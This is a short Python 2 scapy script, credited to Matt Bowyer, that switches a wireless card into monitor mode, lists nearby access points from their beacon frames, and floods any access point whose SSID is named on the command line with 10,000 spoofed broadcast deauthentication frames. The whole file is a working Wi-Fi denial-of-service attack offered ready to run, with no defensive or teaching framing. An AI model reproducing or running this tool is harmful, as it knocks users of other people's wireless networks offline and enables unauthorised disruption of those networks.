#!/usr/bin/python

#Matt Bowyer

import sys
import thread
from scapy.all import *


ap_list = []
threats = []
halt = False
interface = "wlan0"

def packethandler(pkt) :
        if pkt.haslayer(Dot11) :
                if pkt.type == 0 and pkt.subtype == 8:
                        if pkt.addr2 not in ap_list:
                                ap_list.append(pkt.addr2)
                                print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
				if threat(pkt.info):
					thread.start_new_thread(attack, (pkt.addr2, ))
def stopfilter(pkt):
        return halt

def threat(SSID):
	if SSID in threats:
		return True
	return False

def attack(target):
	brdmac = "ff:ff:ff:ff:ff:ff"
	pkt = RadioTap() / Dot11(addr1=brdmac,addr2=target,addr3=target)/ Dot11Deauth()
	print "Attacking Network with BSSID %s" %target
	sendp(pkt, iface = interface, count = 10000, inter = .2) 	


if __name__ == "__main__":
	interface = sys.argv[1]
	os.system('ifconfig %s down' %interface)
	os.system('iwconfig %s mode monitor' %interface)
	os.system('ifconfig %s up' %interface)
	print "ALFA (%s) is in Monitor Mode" %interface
	for i in range(2,len(sys.argv)):
		threats.append(sys.argv[i])
        sniff(iface=interface, prn = packethandler, stop_filter = stopfilter)












